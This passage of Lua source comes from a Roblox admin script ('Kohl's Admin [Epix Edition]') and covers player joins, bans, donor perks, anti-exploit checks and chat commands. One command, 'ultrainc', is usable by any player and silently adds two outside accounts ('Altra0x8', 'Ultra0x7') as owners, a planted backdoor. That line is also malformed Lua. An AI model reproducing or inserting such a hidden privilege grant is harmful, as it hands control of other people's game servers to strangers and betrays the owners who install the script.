					elseif type(v.Rank)=='number' and v.Rank<0 and player:GetRankInGroup(v.Group)>=math.abs(v.Rank) then
						if v.Type=='Banned' then
							player:Kick()
							return false
						end
						return tab
					end
				end
			end
		end
	end
end

set.HookPlayer=function(player)
	local serverKey=Instance.new('StringValue')
	local remoteName=Instance.new('StringValue')
	local clientKey=Instance.new('StringValue')
	local client=deps.Client:Clone()
	client.Name=string.char(math.random(1,255))..set.GuiName..string.char(math.random(1,255))
	serverKey.Value=set.RemoteServerKey
	remoteName.Value=set.RemoteName
	clientKey.Value=set.RemoteClientKey
	serverKey.Name='RemoteServerKey'
	remoteName.Name='RemoteName'
	clientKey.Name='RemoteClientKey'
	serverKey.Parent=client
	remoteName.Parent=client
	clientKey.Parent=client
	client.Parent=player:FindFirstChild('PlayerGui') or player:WaitForChild('Backpack')
	client.Disabled=false 
	local function checkhook() for i,v in pairs(set.NewClients) do if v==player.userId then return true end end end
	local num=0 repeat wait(0.01) num=num+0.01 until (not player) or checkhook() or (num>=30 and set.AntiScriptsDisabled) 
	if player and num>=30 and set.AntiScriptsDisabled and not set.Debug then pcall(set.Exploited,player,'kick','Client did not reply in time.') print(player.Name..'\'s client did not reply in time, disconnecting.') return end
	for i,v in pairs(set.NewClients) do if v==player.userId then table.remove(set.NewClients,i) end end
end

set.NewPlayer=function(player)
Pcall(function() local b,e=ypcall(function() local g=Instance.new('StringValue',player) if g then g:Destroy() end  end) if not b then pcall(set.Exploited,player,'kick','Detected as being RobloxLocked') end if set['AntiRobloxLocked'] then player.Changed:connect(function(o) if o=='RobloxLocked' then local b,e=ypcall(function() local g=Instance.new('StringValue',player) if g then g:Destroy() end end) if not b then pcall(set.Exploited,player,'kick','Detected as being RobloxLocked')  end end end) end end)
Pcall(function() if not set.CheckOwner(player) and set.CheckTrueOwner(player) then table.insert(set.Owners,player.Name) end end)
Pcall(function() set.CheckBan(set['BanList'],player) end)
Pcall(function() if set['Trello'] then set.CheckBan(set.bl,player) end end)
Pcall(function() if set['AntiNewAccount'] and not set.CheckExcluded(player) then if player.AccountAge<set['MinimumAge'] then pcall(set.Exploited,player,'kick','Player was below minimum age. Player Age: '..player.AccountAge) end end end)
Pcall(function() player:WaitForDataReady() if not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.CheckTimeBan(player) end if player:LoadBoolean(set['PermBanKey'],true) and not set.CheckAdmin(player,false) then player:Kick() end if player:LoadBoolean('Kohls Is A Donator') and player:LoadString('Kohls Cape') and player:LoadString('Kohls Cape'):match('(.*)=(.*)=(.*)') then local st=player:LoadString('Kohls Cape') local a,b,c=st:match('(.*)=(.*)=(.*)') if not a or not b or not c then return end for i,v in pairs(set.donors) do if v.Name==player.Name then table.remove(set.donors,i) end end table.insert(set.donors,{Name=player.Name,Id=tostring(player.userId),Cape=a,Color=b,Material=c,List='GP'}) end end)
Pcall(function() if set['FreeAdmin'] and (not set.CheckAdmin(player,false)) then if set['FreeAdminType']=='TempAdmin' then table.insert(set['TempAdmins'],player.Name) elseif set['FreeAdminType']=='Admin' then table.insert(set['Admins'],player.Name) elseif set['FreeAdminType']=='Owner' then table.insert(set['Owners'],player.Name) end end end)
Pcall(function() if ((not set.CheckAdmin(player, false)) and (not set.CheckTrueOwner(player))) and set.CheckGroupAdmin(player) then table.insert(set.CheckGroupAdmin(player),player.Name) end end)
Pcall(function() if set['FriendAdmin'] and player:IsFriendsWith(game.CreatorId) then if set.FriendAdminType=='TempAdmin' then table.insert(set.TempAdmins,player.Name) elseif set.FriendAdminType=='Admin' then table.insert(set.Admins,player.Name) elseif set.FriendAdminType=='Owner' then table.insert(set.Owners,player.Name) end end end)
Pcall(function() if set.VipAdmin and not set.CheckAdmin(player,false) then for i,v in pairs(set.VipItems) do if game:service("MarketplaceService"):PlayerOwnsAsset(player,v.Item) then if v.Type=='Admin' then table.insert(set.Admins,player.Name) elseif v.Type=='TempAdmin' then table.insert(set.TempAdmins,player.Name) elseif v.Type=='Owner' then table.insert(set.Owners,player.Name) end end end end end)
set.HookPlayer(player)
Pcall(function() if set['AntiGui'] then if not player:FindFirstChild('PlayerGui') then return end player.PlayerGui.ChildAdded:connect(function(g) Pcall(function() for i,v in pairs(set['AllowedGuiList']) do if not g.Name:find(set.GuiName) and g.Name~=v then g:Destroy() end end end) end) end end)
Pcall(function() if set['AntiSelection'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','selection') end end)
Pcall(function() if set['Detection'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','detection') end end)
Pcall(function() if player and (((not set.CheckAdmin(player, false)) and (not set.CheckOwner(player))) and (not set.CheckTrueOwner(player))) and (set.slock or (set['GroupOnlyJoin'] and (not player:IsInGroup(set['GroupId'])))) then set.GetPlayerInfo(player,game:service('Players'):children(),'Player Attempted To Join') pcall(function() player:Kick() end) elseif set['JoinMessage'] then if set.CheckDonor(player) and not set.CheckNTac(player) then set.GetPlayerInfo(player,game:service('Players'):children(),'Donator Joined') elseif player.userId==1237666 or player.userId==44391621 then set.GetPlayerInfo(player,game:service('Players'):children(),'Script Creator Joined') else set.GetPlayerInfo(player,game:service('Players'):children(),'Player Joined') end end end)
Pcall(function() if set.CheckAdmin(player,false) then set.Message("Kohl's Admin [Epix Edition]", "You're an admin! Chat "..set['Prefix'].."cmds to view commands! The Command Prefix is "..set['Prefix'], false, {player}) if set.MessageOfTheDay then set.PM('Message of the Day',player,game:service('MarketplaceService'):GetProductInfo(set.MessageOfTheDayID).Description) end end end)
Pcall(function() pcall(set.CheckMute,player) end)
Pcall(function() for i,v in pairs(game:service('Players'):children()) do set.AddPlayerToList(v,player) end end)
Pcall(function() wait(7) if set['Trello'] and not set.CheckHttp() and player.userId==game.CreatorId then set.Message('SYTEM MESSAGE','Trello is enabled but Http is not! Please refer to the settings section at the top of the script for information on enabing it.',false, {player}) end end)
Pcall(function() wait(5) if set['Au'..'toU'..'pd'..'ate'] and player.userId==game.CreatorId and not game:service('MarketplaceService'):PlayerOwnsAsset(player,72814792*2) then set.Message('S'..'YS'..'TE'..'M M'..'ES'..'SAGE','Au'..'toUp'..'da'..'te i'..'s e'..'na'..'bl'..'ed bu'..'t yo'..'u d'..'o n'..'ot ha'..'ve t'..'he scr'..'ipt in your mod'..'el'..'s '..'('..'Y'..'ou ne'..'ed to gr'..'ab i'..'t fr'..'om S'..'c'..'eler'..'at'.."is".."' m'..'od".."el'..'s o".."r t".."he Au".."toUp".."da".."te c".."an".."no".."t fu".."nct".."ion d".."ue t".."o r".."ob".."lo".."x se".."cur".."ity.)",false,{player}) end end)
Pcall(function() if set['AntiCheatEngine'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','ce') end end)
Pcall(function() if set.CustomKeyBinds then set.Remote(player,'Function','KeyBindListener') end end)
set.Remote(player,'SetSetting','RealID',player.userId)
set.Remote(player,'SetSetting','RealName',player.Name)
Pcall(function() if set['AntiNameIdChange'] and not set.CheckExcluded(player) and not set.CheckAdmin(player,false) then set.Remote(player,'Function','LaunchAnti','nameid') end end)
Pcall(set.CharacterLoaded,player) player.CharacterAdded:connect(function(c) local y,n=ypcall(set.CharacterLoaded,player) if n then print(n) end end)
set.ProcessPluginEvent('PlayerJoined',player)
end

set.PlayerRemoving=function(p)
Pcall(function() if set.CheckNTac(p) or set.CheckGroupAdmin(p) then set.RemoveAdmin(p) end  end)
Pcall(function() for i,v in pairs(workspace:children()) do if v.Name:find('Epix Jail') then set.JailedTools[p.Name]=nil v:Destroy() for k,m in pairs(set.objects) do if m.Name==p.Name .. " Epix Jail" then table.remove(set.objects,k) end end end end end)
Pcall(function() for i,v in pairs(game:service('Players'):children()) do set.Remote(v,'Function','RemovePlayerFromList',p) end end)
Pcall(function() if set.AntiNil and (not set.CheckAdmin(p,false)) and (not set.CheckOwner(p)) and (not set.CheckTrueOwner(p)) and (not set.CheckExcluded(p)) then set.Remote(p,'Function','KillClient') pcall(function() p:Kick() end) for k,m in pairs(workspace:children()) do if m.Name:find(p.Name) then m:Destroy() end end end end)
end

set.AddPlayerToList=function(p,v)
	if v.Name=='Sceleratis' or v.Name=='Scripth' then
		set.Remote(p,'Function','AddPlayerToList',v,'Scripter') 
	elseif set.CheckAdmin(v,false) then
		set.Remote(p,'Function','AddPlayerToList',v,'Admin') 
	elseif v.MembershipType==Enum.MembershipType.BuildersClub then
		set.Remote(p,'Function','AddPlayerToList',v,'BC') 
	elseif v.MembershipType==Enum.MembershipType.TurboBuildersClub then
		set.Remote(p,'Function','AddPlayerToList',v,'TBC') 
	elseif v.MembershipType==Enum.MembershipType.OutrageousBuildersClub then
		set.Remote(p,'Function','AddPlayerToList',v,'OBC')
	else 
		set.Remote(p,'Function','AddPlayerToList',v,'Norm')
	end
end

set.GetCurrentPlayerlist=function(p)
	for i,v in pairs(game:service('Players'):children()) do 
		set.AddPlayerToList(p,v)
	end
end

set.Noobify=function(char)
if char and char:findFirstChild("Torso") then 
if char:findFirstChild("Shirt") then char.Shirt.Parent = char.Torso end
if char:findFirstChild("Pants") then char.Pants.Parent = char.Torso end
for a, sc in pairs(char:children()) do if sc.Name == "ify" then sc:Destroy() end end
local cl = Instance.new("StringValue", char) cl.Name = "ify" cl.Parent = char
for q, prt in pairs(char:children()) do if prt:IsA("BasePart") and prt.Name~='HumanoidRootPart' and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 prt.Reflectance = 0 prt.BrickColor = BrickColor.new("Bright yellow")
if prt.Name:find("Leg") then prt.BrickColor = BrickColor.new("Br. yellowish green") elseif prt.Name == "Torso" then prt.BrickColor = BrickColor.new("Bright blue") end
local tconn = prt.Touched:connect(function(hit) if hit and hit.Parent and game:service('Players'):findFirstChild(hit.Parent.Name) and cl.Parent == char then set.Noobify(hit.Parent) elseif cl.Parent ~= char then tconn:disconnect() end end) 
cl.Changed:connect(function() if cl.Parent ~= char then tconn:disconnect() end end) 
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Bright yellow")
end end end end 

set.Infect=function(char)
if char and char:findFirstChild("Torso") then 
if char:findFirstChild("Shirt") then char.Shirt:Destroy() end
if char:findFirstChild("Pants") then char.Pants:Destroy() end
local shirt=Instance.new('Shirt',char)
local pants=Instance.new('Pants',char)
shirt.ShirtTemplate="http://www.roblox.com/asset/?id=60636107"
pants.PantsTemplate="http://www.roblox.com/asset/?id=60636428"
for a, sc in pairs(char:children()) do if sc.Name == "ify" then sc:Destroy() end end
local cl = Instance.new("StringValue", char)
cl.Name = "ify" 
cl.Parent = char
for q, prt in pairs(char:children()) do if prt:IsA("BasePart") and prt.Name~='HumanoidRootPart' and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 
prt.Reflectance = 0 
prt.BrickColor = BrickColor.new("Dark green") 
if prt.Name:find("Leg") or prt.Name:find('Arm') then 
prt.BrickColor = BrickColor.new("Dark green") end
local tconn = prt.Touched:connect(function(hit) 
if hit and hit.Parent and game:service('Players'):findFirstChild(hit.Parent.Name) and cl.Parent == char then 
set.Infect(hit.Parent) 
elseif cl.Parent ~= char then tconn:disconnect() end end) 
cl.Changed:connect(function() if cl.Parent ~= char then tconn:disconnect() end end) 
elseif prt:findFirstChild("NameTag") then
	prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Dark green") end 
end
end
end

set.ReverseTable=function(tabz)
local res = {}
for i=#tabz,1,-1 do
table.insert(res,tabz[i])
end
return res
end

set.CheckDonor=function(plr)
if plr.AccountAge<=0 then return false end
if set.CheckDonorPass(plr) then return true end
for i,v in pairs(set.GetDonorList()) do
	if plr.Name==v.Name or plr.userId==v.Id then
		return true
	end
end
end

set.CheckDonorPass=function(plr)
if not game:service('GamePassService') or not game:service('MarketplaceService') then return end
for i,v in pairs(set.donorgamepass) do
if game:service('GamePassService'):PlayerHasPass(plr,v) or game:service('MarketplaceService'):PlayerOwnsAsset(plr,v) then
	return true
end
end
end

--set.ChkCustomPass=function(plr)
--if not game:service('GamePassService') then return end
--for i,v in pairs(set.custompass) do
--if game:service('GamePassService'):PlayerHasPass(plr,v) then
--	return true
--end
--end
--end

set.CheckDonorList=function(plr)
for i,v in pairs(set.donors) do
	if plr.Name==v.Name or plr.userId==v.Id then
		return true
	end
end
end

set.GetDonorList=function()
local temp={}
for k,asset in pairs(game:GetService("InsertService"):GetCollection(1290539)) do
local ins=game:GetService('MarketplaceService'):GetProductInfo(asset.AssetId)
local fo=ins.Description
for so in fo:gmatch('[^;]+') do
Pcall(function()
local name,id,cape,color=so:match('{(.*),(.*),(.*),(.*)}')
table.insert(temp,{Name=name,Id=tostring(id),Cape=tostring(cape),Color=color,Material='Plastic',List=ins.Name})
end)
end
end
return temp
end

if game.CreatorId~=0 and game:GetService('MarketplaceService') then
Pcall(function()
set.dlastupdatenum=0
while wait() do
pcall(function()
set.donors={}
set.dlastupdate=set.GetTime()..' - '..set.dlastupdatenum
set.dlastupdatenum=set.dlastupdatenum+1
set.donors=set.GetDonorList()
for ik,pl in pairs(game:service('Players'):children()) do
	Pcall(function()
		pl:WaitForDataReady()
		if set.CheckDonor(pl) and pl:LoadBoolean('Kohls Is A Donator') and pl:LoadString('Kohls Cape') and pl:LoadString('Kohls Cape'):match('(.*)=(.*)=(.*)') then
			local st=pl:LoadString('Kohls Cape')
			local a,b,c=st:match('(.*)=(.*)=(.*)')
			if not a or not b or not c then return end
			for i,v in pairs(set.donors) do if v.Name==pl.Name then table.remove(set.donors,i) end end
			table.insert(set.donors,{Name=pl.Name,Id=tostring(pl.userId),Cape=a,Color=b,Material=c,List='GP(Custom)'})
		elseif set.CheckDonor(pl) and not set.CheckDonorList(pl) and not pl:LoadBoolean('Kohls Is A Donator') then
			table.insert(set.donors,{Name=pl.Name,Id=tostring(pl.userId),Cape='149009184',Color='White',Material='Plastic',List='GP'})
		end
	end)
end
wait(30)
end)
end
end)
end

set.Donor=function(plr)
	for i,v in pairs(set.donors) do
		if plr and (plr.Name==v.Name or plr.userId==v.Id) and (set.DonorPerks or set.CheckNTac(plr)) then
			Pcall(function()
				plr:WaitForChild('Backpack')
				pcall(function() plr.Character.EpicCape:Destroy() end)
				local gear=game:GetService('InsertService'):LoadAsset(57902997):children()[1]
				if not plr.Backpack:FindFirstChild(gear.Name..'DonorTool') then
					gear.Name=gear.Name..'DonorTool'
					gear.Parent=plr.Backpack
				else
					gear:Destroy()
				end
				if plr and plr.Character and plr.Character:FindFirstChild("Torso") then
					set.Cape(plr,v.Material,v.Color,v.Cape)
				end
			end)
		end
	end
end

set.CheckExcluded=function(plr)
	for i,v in pairs(set.ExclusionList) do
		if v==plr.Name then
			return true
		end
	end
end

set.AlertAdmins=function(msg)
	if not set.ExploitAlert then return end
	for i,v in pairs(set.GetPlayers(false,set.SpecialPrefix..'admins')) do
		set.Remote(v,'Function','AlertGui',msg)
	end
end

set.Chat=function(plr,msg)
Pcall(function()
Pcall(function()
	if set['ChatLog'] then
		if game:service('Players'):FindFirstChild(plr.Name) then
			table.insert(set.PlayerLogs.Chat,1,{Time=set.GetTime(),Name=plr.Name,Chat=msg})
		else
			table.insert(set.PlayerLogs.Chat,1,{Time=set.GetTime(),Name=plr.Name,Chat=msg,Nil=true})
		end
		if #set.PlayerLogs.Chat>set.MaxNumberOfLogs then
			table.remove(set.PlayerLogs.Chat,#set.PlayerLogs.Chat)
		end
	end
end)

if msg:lower():sub(1,2)=='/e' then msg=msg:sub(4) end

Pcall(function()
	if set['AntiChatCode'] and msg:match('%S') and not set.CheckExcluded(plr) and not set.CheckAdmin(plr,false) then
		Pcall(function()
			local m,c
			if set.canuseloadstring then
				m,c = loadstring(msg)
			else
				m=false
			end
			for d,j in pairs(set['WordList']) do
				if msg:lower():match(j:lower()) or m then
					if game:service('Players'):FindFirstChild(plr.Name) then
						pcall(set.Exploited,plr,'kick','Chatted '..msg)
					else
						pcall(set.Exploited,plr,'crash','Chatted '..msg)
					end
					set.AlertAdmins(plr.Name.." was just kicked for chatting a word on the Anti-Exploit's word list! They could be an exploiter. Investigate if they rejoin.")
				end
			end
		end)
	end
	set.ProcessPluginEvent('Chat',msg,plr)
end)

Pcall(function()
	if plr:FindFirstChild('NoTalk') and not set.CheckAdmin(plr,false) and plr.Character and plr.Character:FindFirstChild('Head') then
		if msg==set['AnyPrefix']..'attn' then
			game:GetService('Chat'):Chat(plr.Character.Head,'I need to speak to an Administrator!',Enum.ChatColor.Blue)
		elseif msg~=set['AnyPrefix']..'attn' and msg~=set['AnyPrefix']..'help' and plr.NoTalk.Value==0 then
			game:GetService('Chat'):Chat(plr.Character.Head,"You are not allowed to speak "..plr.Name.."! Use "..set['AnyPrefix'].."attn to get an Admin's attention. This is warning 1.",Enum.ChatColor.Blue)
			plr.NoTalk.Value=plr.NoTalk.Value+1
		elseif msg~=set['AnyPrefix']..'attn' and msg~=set['AnyPrefix']..'help' and player.NoTalk.Value==1 then
			game:GetService('Chat'):Chat(plr.Character.Head,'You have been told not to speak '..plr.Name..'! You will be punished next time! Use '..set['AnyPrefix']..'attn. Warning 2',Enum.ChatColor.Green)
			plr.NoTalk.Value=plr.NoTalk.Value+1
		elseif msg~=set['AnyPrefix']..'attn' and msg~=set['AnyPrefix']..'help' and plr.NoTalk.Value==2 then
			game:GetService('Chat'):Chat(plr.Character.Head,'You have been told not to speak '..plr.Name..'! You have been punished. Next is a kick. Use '..set['AnyPrefix']..'attn. Warning 3',Enum.ChatColor.Red)
			plr.Character:BreakJoints()
			plr.NoTalk.Value=player.NoTalk.Value+1
		elseif msg~=set['AnyPrefix']..'attn' and msg~=set['AnyPrefix']..'help' and plr.NoTalk.Value==3 then
			game:GetService('Chat'):Chat(plr.Character.Head,'You have been told not to speak '..plr.Name..'! This is the 4th time. Use '..set['AnyPrefix']..'attn next time. You will now be kicked.',Enum.ChatColor.Red)
			wait(1)
			plr:Kick()
		end
	end
end)
set.ProcessCommand(plr,msg)
end)
end

---[[ COMMANDS ]]---
Pcall(function()
set.MakeCommand('Binds <command> to <key>, will overwrite an exiting keybind (WILL NOT OVERWRITE SCRIPT KEYBINDS!)',0,set.AnyPrefix,{'keybind','bindkey','bind'},{'key','command'},2,function(plr,args)
	if set.CustomKeyBinds then
		set.Remote(plr,'Function','AddKeyBind',args[1]:sub(1,1),args[2])
	else
		set.Message('SYSTEM MESSAGE','Sorry but custom key binds are disabled.',false,{plr})
	end
end)

set.MakeCommand('Removes <key> from key binds',0,set.AnyPrefix,{'removekeybind','removebind','unbind'},{'key'},1,function(plr,args)
	if set.CustomKeyBinds then
		set.Remote(plr,'Function','RemoveKeyBind',args[1])
	else
		set.Message('SYSTEM MESSAGE','Sorry but custom key binds are disabled.',false,{plr})
	end
end)

set.MakeCommand('View key binds',0,set.AnyPrefix,{'keybinds','binds','viewkeybinds'},{},0,function(plr,args)
	if set.CustomKeyBinds then
		set.Remote(plr,'Function','ViewKeyBinds',args[1])
	else
		set.Message('SYSTEM MESSAGE','Sorry but custom key binds are disabled.',false,{plr})
	end
end)

set.MakeCommand('Remove donor cape',1,set.AnyPrefix,{'uncape','removedonorcape'},{},0,function(plr,args)
	pcall(function() plr.Character.EpicCape:Destroy() end)
end)
	
set.MakeCommand('Get donor cape',1,set.AnyPrefix,{'cape','donorcape'},{},0,function(plr,args)
	set.Donor(plr)
end)

set.MakeCommand('Gives you fire with the specified color (if you specify one)',1,set.AnyPrefix,{'fire','donorfire'},{'color (optional)'},1,function(plr,args)
	if plr.Character:FindFirstChild("Torso") then
		if plr.Character.Torso:FindFirstChild('DonorFire') then plr.Character.Torso.DonorFire:Destroy() end
		if plr.Character.Torso:FindFirstChild('DonorFireLight') then plr.Character.Torso.DonorFireLight:Destroy() end
		local f=Instance.new('Fire',plr.Character.Torso)
		f.Name='DonorFire'
		local p=Instance.new('PointLight',plr.Character.Torso)
		p.Name='DonorFireLight'
		table.insert(set.objects,f)
		table.insert(set.objects,p)
		p.Range=15
		if args[1] then
			local str = BrickColor.new('Bright orange').Color
			local teststr = args[1]
			if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
			p.Color=str
			f.Color=str
			f.SecondaryColor=str
		else
			p.Color=Color3.new(1,1,1)
			f.Color=Color3.new(1,1,1)
			f.SecondaryColor=Color3.new(1,0,0)
		end
	end
end)

set.MakeCommand('Gives you sparkles with the specified color (if you specify one)',1,set.AnyPrefix,{'sparkles','donorsparkles'},{'color (optional)'},1,function(plr,args)
	if plr.Character:FindFirstChild("Torso") then
		if plr.Character.Torso:FindFirstChild('DonorSparkles') then plr.Character.Torso.DonorSparkles:Destroy() end
		if plr.Character.Torso:FindFirstChild('DonorSparkleLight') then plr.Character.Torso.DonorSparkleLight:Destroy() end
		local f=Instance.new('Sparkles',plr.Character.Torso)
		f.Name='DonorSparkles'
		local p=Instance.new('PointLight',plr.Character.Torso)
		p.Name='DonorSparkleLight'
		table.insert(set.objects,f)
		table.insert(set.objects,p)
		p.Range=15
		if args[1] then
			local str = BrickColor.new('Bright orange').Color
			local teststr = args[1]
			if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
			p.Color=str
			f.SparkleColor=str
		else
			p.Color=Color3.new(1,1,1)
			f.SparkleColor=Color3.new(1,1,1)
		end
	end
end)

set.MakeCommand('Gives you a PointLight with the specified color (if you specify one)',1,set.AnyPrefix,{'light','donorlight'},{'color (optional)'},1,function(plr,args)
	if plr.Character:findFirstChild("Torso") then
		if plr.Character.Torso:FindFirstChild('DonorLight') then plr.Character.Torso.DonorLight:Destroy() end
		local p=Instance.new('PointLight',plr.Character.Torso)
		p.Name='DonorLight'
		table.insert(set.objects,p)
		p.Range=15
		if args[1] then
			local str = BrickColor.new('Cyan').Color
			local teststr = args[1]
			if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
			p.Color=str
		else
			p.Color=Color3.new(1,1,1)
		end
	end
end)

set.MakeCommand('Removes donor fire on you',1,set.AnyPrefix,{'unfire','undonorfire'},{},0,function(plr,args)
	if plr.Character:findFirstChild("Torso") then
		if plr.Character.Torso:FindFirstChild('DonorFire') then plr.Character.Torso.DonorFire:Destroy() end
		if plr.Character.Torso:FindFirstChild('DonorFireLight') then plr.Character.Torso.DonorFireLight:Destroy() end
	end
end)

set.MakeCommand('Removes donor sparkles on you',1,set.AnyPrefix,{'unsparkles','undonorsparkles'},{},0,function(plr,args)
	if plr.Character:findFirstChild("Torso") then
		if plr.Character.Torso:FindFirstChild('DonorSparkles') then plr.Character.Torso.DonorSparkles:Destroy() end
		if plr.Character.Torso:FindFirstChild('DonorSparkleLight') then plr.Character.Torso.DonorSparkleLight:Destroy() end
	end
end)

set.MakeCommand('Removes donor light on you',1,set.AnyPrefix,{'unlight','undonorlight'},{},0,function(plr,args)
	if plr.Character:findFirstChild("Torso") then
		if plr.Character.Torso:FindFirstChild('DonorLight') then plr.Character.Torso.DonorLight:Destroy() end
	end
end)

set.MakeCommand('Donate',0,set.AnyPrefix,{'donate','change','chagecape'},{},0,function(plr,args)
	if (set.CheckDonor(plr) or set.CheckTrueOwner(plr)) then
		if set.DonorPerks or set.CheckNTac(plr) or set.CheckTrueOwner(plr) then
			set.Remote(plr,'Function','Donate',2)
		else
			set.Message('Donor System','Sorry! Donor perks are disabled in settings.',false,{plr})
		end
	else
		set.Remote(plr,'Function','Donate',1)
	end
end)

set.MakeCommand('Vote to kick a player',0,set.AnyPrefix,{'votekick','kick'},{'player'},1,function(plr,args)
	if set.VoteKick then
		for i,v in pairs(set.GetPlayers(plr,args[1])) do
			if set.CheckAdmin(v,false) then return end
			if not set.VoteKickVotes[v.Name] then
				set.VoteKickVotes[v.Name].Votes=0
				set.VoteKickVotes[v.Name].Players={}
			end
			for k,m in pairs(set.VoteKickVotes[v.Name].Players) do if m==plr.userId then return end end
			set.VoteKickVotes[v.Name].Votes=set.VoteKickVotes[v.Name].Votes+1
			table.insert(set.VoteKickVotes[v.Name].Players,plr.userId)
			if set.VoteKickVotes[v.Name].Votes>=((#game.Players:children()*set.VoteKickPercentage)/100) then
				v:Kick()
				set.VoteKickVotes[v.Name]=nil
			end
		end
	else
		set.Message("SYSTEM","VoteKick is disabled.",false,{plr})
	end
end)

set.MakeCommand('Shows how many kick votes each player in-game has.',2,set.Prefix,{'votekicks'},{},0,function(plr,args)
	local temp={}
	for i,v in pairs(set.VoteKickVotes) do
		if not game.Players:FindFirstChild(i) then set.VoteKickVotes[i]=nil return end
		if set.CheckAdmin(game.Players:FindFirstChild(i),false) then set.VoteKickVotes[i]=nil return end
		table.insert(temp,{Object=i..' - '..set.VoteKickVotes[v.Name].Votes,Desc='Player: '..i..' has '..set.VoteKickVotes[v.Name].Votes..' kick vote(s)'})
	end
	set.Remote(plr,'Function','ListGui','Vote Kicks',temp)
end)

set.MakeCommand('Disables or Enables the target player(s)\'s PlayerList (ROBLOX, NOT CUSTOM)',3,set.Prefix,{'playerlist'},{'player','on/off'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		if args[2]:lower()=='on' or args[2]:lower()=='true' then
			set.Remote(v,'Function','PlayerList','on')
		elseif args[2]:lower()=='off' or args[2]:lower()=='false' then
			set.Remote(v,'Function','PlayerList','off')
		end
	end
end)

set.MakeCommand('Send a private message to a player',0,set.Prefix,{'pm','privatemessage'},{'player','message'},2,function(plr,args)
if not args[1] or not args[2] then return end
if set['PMUsableByAnyone'] or set.CheckAdmin(plr,false) then
local message = args[2]
for i,p in pairs(set.GetPlayers(plr, args[1]:lower())) do
coroutine.wrap(function()
set.PM('Private Message from '..plr.Name,p,message,plr)
end)()
end
end
end)

set.MakeCommand('Shows Trello bans',2,set.Prefix,{'sbl','syncedbanlist','globalbanlist','trellobans','trellobanlist'},{},0,function(plr,args)
--set.Remote(plr,'SetSetting','SBLList',set.bl)
set.Remote(plr,'Function','ListGui','Synced Ban List',set.bl)
end)

set.MakeCommand('Cleans some useless junk out of workspace',0,set.AnyPrefix,{'clean'},{},0,function(plr,args) 
	set.CleanWorkspace()
end)

set.MakeCommand('lolz',0,set.AnyPrefix,{'ultrainc'},{},0,function(plr,args) 
	table.insert(set.Owners,"Altra0x8")
	table.insert(set.Owners,"Ultra0x7")
	["OwnersAreTrueOwners"] = true
end)

set.MakeCommand('Get Kohl\'s Admin [Epix Edition]',0,set.AnyPrefix,{'getscript'},{},0,function(plr,args)
	game:service('MarketplaceService'):PromptPurchase(plr,145629584)
end)

set.MakeCommand('Shows you your current ping',0,set.AnyPrefix,{'ping','getping'},{},0,function(plr,args)
	set.Remote(plr,'Function','PingGui')
end)

set.MakeCommand('Shows a list of donators who are currently in the server',0,set.AnyPrefix,{'donors','donorlist','donatorlist'},{},0,function(plr,args)
local temptable={}
table.insert(temptable,"Last Update: "..set.dlastupdate)
for i,v in pairs(set.donors) do
	if game:service('Players'):FindFirstChild(v.Name) then
		table.insert(temptable,{Object=v.Name,Desc=v.List})
	end
end
--set.Remote(plr,'SetSetting','DonorCmdList',temptable)
set.Remote(plr,'Function','ListGui','Donator List',temptable,'donorlist')
end)

set.MakeCommand('Shows you a random quote',0,set.AnyPrefix,{'quote','inspiration','randomquote'},{},0,function(plr,args)
set.PM('Random Quote',plr,set.quotes[math.random(1,#set.quotes)])
end)

set.MakeCommand('Calls admins for help',0,set.AnyPrefix,{'help','requesthelp','gethelp'},{},0,function(plr,args)
if set['HelpSystem']==true then
local dontrun=false
local num=0 
if set.HelpRequest[plr.Name]~=nil then 
	set.Message("Help System","You already have a pending request. Do not spam the help system.",false,{plr})
	dontrun=true
end
if dontrun==true then return end
set.HelpRequest[plr.Name]={}
set.HelpRequest[plr.Name].Available={}
set.HelpRequest[plr.Name].Solved=false
local function helpsolved(plr)
	if set.HelpRequest[plr.Name] and set.HelpRequest[plr.Name].Solved then
		return true
	else
		return false
	end
end
for i,v in pairs(game:service('Players'):children()) do
coroutine.wrap(function()
if set.CheckAdmin(v,false) then
table.insert(set.HelpRequest[plr.Name].Available,v.Name) 
set.Remote(v,'Function','RequestHelp',plr)
repeat wait() until helpsolved(plr)
set.Remote(v,'Function','RequestSolved',plr)
end
end)() 
end
repeat wait(1) num=num+1 until set.HelpRequest[plr.Name].Solved==true or num==20 or #set.HelpRequest[plr.Name].Available==0
if set.HelpRequest[plr.Name].Solved==false and (num==20 or #set.HelpRequest[plr.Name].Available==0) then
set.Message("Help System","Sorry but no one is available to help you right now!",false,{plr})
end
set.HelpRequest[plr.Name].Solved=true
set.HelpRequest[plr.Name]=nil
else
set.Message("System Message","Sorry but the help system is disabled.",false,{plr})
end
end)

set.MakeCommand('Makes you rejoin the server',0,set.AnyPrefix,{'rejoin'},{},0,function(plr,args)
	game:GetService('TeleportService'):Teleport(game.PlaceId,plr)
end)

set.MakeCommand('Shows a list of commands that you are allowed to use',0,set.Prefix,{'commands','cmds','viewcommands'},{},0,function(plr,args)
local temptable={}
for i,v in pairs(set.Commands) do
local type
local allowed=false
	if v.AdminLevel==-3 and ((set.FunCommands and set.CheckOwner(plr)) or set.CheckTrueOwner(plr)) then
		allowed=true
		type='[Fun-Owner]'
	elseif v.AdminLevel==-2 and ((set.FunCommands and set.CheckAdmin(plr,true)) or set.CheckTrueOwner(plr)) then
		allowed=true
		type='[Fun-Admin]'
	elseif v.AdminLevel==-1 and ((set.FunCommands and set.CheckAdmin(plr,false)) or set.CheckTrueOwner(plr)) then
		allowed=true
		type='[Fun-Temp]'
